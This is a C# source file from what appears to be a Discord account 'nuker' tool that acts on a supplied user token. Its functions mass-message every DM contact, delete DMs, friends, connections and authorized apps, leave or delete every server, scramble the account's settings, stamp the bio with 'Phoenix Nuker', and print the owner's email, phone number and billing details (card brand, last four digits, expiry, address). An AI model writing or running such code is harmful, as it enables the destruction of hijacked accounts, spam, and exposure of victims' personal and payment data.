﻿using Newtonsoft.Json.Linq;
using Solaris.API;
using System;
using System.Drawing;
using Console = Colorful.Console;

public static class User
{
    public static void MassDM(string token, string message)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            foreach (dynamic item in JArray.Parse(Request.Send("/users/@me/channels", "GET", token)))
            {
                Request.Send($"/channels/{item.id}/messages", "POST", token, "{\"content\":\"" + message + "\"}");
                Console.WriteLine($"Messaged: {item.recipients[0].username}#{item.recipients[0].discriminator}", Color.Lime);
                Config.Sleep(Config.Wait.Short);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void DeleteDMs(string token)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            foreach (dynamic item in JArray.Parse(Request.Send("/users/@me/channels", "GET", token)))
            {
                Request.Send($"/channels/{item.id}", "DELETE", token);
                Console.WriteLine($"Deleted: {item.recipients[0].username}#{item.recipients[0].discriminator}", Color.Lime);
                Config.Sleep(Config.Wait.Short);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void UserInformation(string token)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            string json = Request.Send("/users/@me", "GET", token);
            var jToken = JObject.Parse(json)["id"];
            if (jToken != null && !string.IsNullOrEmpty(jToken.ToString()))
            {
                jToken.ToString();
            }
            var jToken2 = JObject.Parse(json)["flags"];
            string text;
            if (jToken2 == null || string.IsNullOrEmpty(jToken2.ToString()))
            {
                text = "";
            }
            else
            {
                text = jToken2.ToString();
            }

            string text2 = "";
            switch (text)
            {
                case "1":
                    text2 += "Discord Employee, ";
                    break;

                case "2":
                    text2 += "Partnered Guild Owner, ";
                    break;

                case "4":
                    text2 += "HypeSquad Events Member, ";
                    break;

                case "8":
                    text2 += "Bug Hunter Level 1, ";
                    break;

                case "64":
                    text2 += "House Bravery Member, ";
                    break;

                case "128":
                    text2 += "House Brilliance Member, ";
                    break;

                case "256":
                    text2 += "House Balance Member, ";
                    break;

                case "512":
                    text2 += "Early Nitro Supporter, ";
                    break;

                case "16384":
                    text2 += "Bug Hunter Level 2, ";
                    break;

                case "131072":
                    text2 += "Early Verified Bot Developer, ";
                    break;
            }
            text2 = text2.TrimEnd(' ', ',');
            var value = JObject.Parse(json)["email"];
            var value2 = JObject.Parse(json)["phone"];
            var value3 = JObject.Parse(json)["bio"];
            var value4 = JObject.Parse(json)["locale"];
            var value5 = JObject.Parse(json)["nsfw_allowed"];
            var value6 = JObject.Parse(json)["mfa_enabled"];
            var jToken3 = JObject.Parse(json)["avatar"];
            string value7;
            string condition;
            if (jToken3 == null || string.IsNullOrEmpty(jToken3.ToString()))
            {
                condition = "";
            }
            else
            {
                condition = jToken3.ToString();
            }

            if (!string.IsNullOrEmpty(condition))
            {
                value7 = $"https://cdn.discordapp.com/avatars/{jToken}/{jToken3}.webp";
            }
            else
            {
                value7 = "N/A";
            }

            string json2 = Request.Send("/users/@me/settings", "GET", token);
            var value8 = JObject.Parse(json2)["theme"];
            var value9 = JObject.Parse(json2)["developer_mode"];
            var value10 = JObject.Parse(json2)["status"];
            Console.ForegroundColor = Color.GhostWhite;
            Console.WriteLine("User Information:\n");
            Console.WriteLine($"User ID: {jToken}\nEmail: {value}\nPhone Number: {value2}\nBiography: {value3}\nLocale: {value4}\nNSFW Allowed: {value5}\n2FA Enabled: {value6}\nBadges: {text2}\nTheme: {value8}\nDeveloper Mode: {value9}\nStatus: {value10}\nAvatar: {value7}");
            if (Request.Send("/users/@me/billing/payment-sources", "GET", token).Length > 2)
            {
                Console.WriteLine("\nBilling Information:\n");
                foreach (dynamic item in JArray.Parse(Request.Send("/users/@me/billing/payment-sources", "GET", token)))
                {
                    if (item.type == "1")
                    {
                        object obj = item.invalid;
                        object obj2 = item.brand;
                        object obj3 = item.last_4;
                        object obj4 = item.expires_month;
                        object obj5 = item.expires_year;
                        object obj6 = item.billing_address["name"];
                        object obj7 = item.billing_address["line_1"];
                        object obj8 = item.billing_address["line_2"];
                        object obj9 = item.billing_address["city"];
                        object obj10 = item.billing_address["state"];
                        object obj11 = item.billing_address["country"];
                        object obj12 = item.billing_address["postal_code"];
                        Console.WriteLine($"Type: Credit Card\nInvalid: {obj}\nBrand: {obj2}\nExpiration Date: {obj4}/{obj5}\nCardholder Name: {obj6}\nLast 4 Digits: {obj3}\nAddress 1: {obj7}\nAddress 2: {obj8}\nCity: {obj9}\nState: {obj10}\nCountry: {obj11}\nPostal Code: {obj12}");
                    }
                    else if (item.type == "2")
                    {
                        object obj13 = item.invalid;
                        object obj14 = item.billing_address["name"];
                        object obj15 = item.email;
                        object obj16 = item.billing_address["line_1"];
                        object obj17 = item.billing_address["line_2"];
                        object obj18 = item.billing_address["city"];
                        object obj19 = item.billing_address["state"];
                        object obj20 = item.billing_address["country"];
                        object obj21 = item.billing_address["postal_code"];
                        Console.WriteLine($"Type: PayPal\nInvalid: {obj13}\nName: {obj14}\nEmail: {obj15}\nAddress 1: {obj16}\nAddress 2: {obj17}\nCity: {obj18}\nState: {obj19}\nCountry: {obj20}\nPostal Code: {obj21}");
                    }
                }
            }
            Console.WriteLine("\nPress any key to go back.");
            Console.ReadKey();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void ConfuseMode(string token)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            Request.Send("/users/@me/settings", "PATCH", token, "{\"locale\": \"zh-CN\",\"theme\": \"light\", \"developer_mode\": \"false\", \"message_display_compact\": \"true\", \"explicit_content_filter\": \"0\"}");
            Config.Sleep(Config.Wait.Short);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void ChangeTheme(string token, string theme)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            Request.Send("/users/@me/settings", "PATCH", token, "{\"theme\": \"" + theme + "\"}");
            Config.Sleep(Config.Wait.Short);
        }
        catch
        {
        }
    }

    public static void RemoveConnections(string token)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            foreach (dynamic item in JArray.Parse(Request.Send("/users/@me/connections", "GET", token)))
            {
                Request.Send($"/users/@me/connections/{item.type}/{item.id}", "DELETE", token);
                Console.WriteLine($"Removed: {item.type}", Color.Lime);
                Config.Sleep(Config.Wait.Short);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void DeauthorizeApps(string token)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            foreach (dynamic item in JArray.Parse(Request.Send("/oauth2/tokens", "GET", token)))
            {
                Request.Send($"/oauth2/tokens/{item.id}", "DELETE", token);
                Console.WriteLine("Removed: " + item.application["name"], Color.Lime);
                Config.Sleep(Config.Wait.Short);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void LeaveHypeSquad(string token)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            Request.Send("/hypesquad/online", "DELETE", token);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void ClearRelationships(string token)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            foreach (dynamic item in JArray.Parse(Request.Send("/users/@me/relationships", "GET", token)))
            {
                Request.Send($"/users/@me/relationships/{item.id}", "DELETE", token);
                Console.WriteLine($"Removed: {item.user.username}#{item.user.discriminator}", Color.Lime);
                Config.Sleep(Config.Wait.Short);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void LeaveDeleteGuilds(string token)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            foreach (dynamic item in JArray.Parse(Request.Send("/users/@me/guilds", "GET", token)))
            {
                if (item.owner == true)
                {
                    Request.Send($"/guilds/{item.id}", "DELETE", token);
                    Console.WriteLine($"Deleted: {item.name}", Color.Lime);
                }
                else
                {
                    Request.Send($"/users/@me/guilds/{item.id}", "DELETE", token);
                    Console.WriteLine($"Left: {item.name}", Color.Lime);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void ChangeHypeSquad(string token, string hypesquad)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            switch (hypesquad)
            {
                case "0":
                    Request.Send("/hypesquad/online", "DELETE", token);
                    break;

                case "1":
                    Request.Send("/hypesquad/online", "POST", token, "{\"house_id\": 1}");
                    break;

                case "2":
                    Request.Send("/hypesquad/online", "POST", token, "{\"house_id\": 2}");
                    break;

                case "3":
                    Request.Send("/hypesquad/online", "POST", token, "{\"house_id\": 3}");
                    break;
            }
            Config.Sleep(Config.Wait.Short);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void ChangeStatus(string token, string status)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            Request.Send("/users/@me/settings", "PATCH", token, "{\"custom_status\": {\"text\": \"" + status + "\"}}");
            Config.Sleep(Config.Wait.Short);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }

    public static void LockAccount(string token)
    {
        Console.ReplaceAllColorsWithDefaults();
        try
        {
            Request.Send("/users/@me", "PATCH", token, "{\"bio\": \"Phoenix Nuker\"}");
            Config.Sleep(Config.Wait.Short);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed: {ex.Message}", Color.Red);
            Config.Sleep(Config.Wait.Long);
        }
    }
}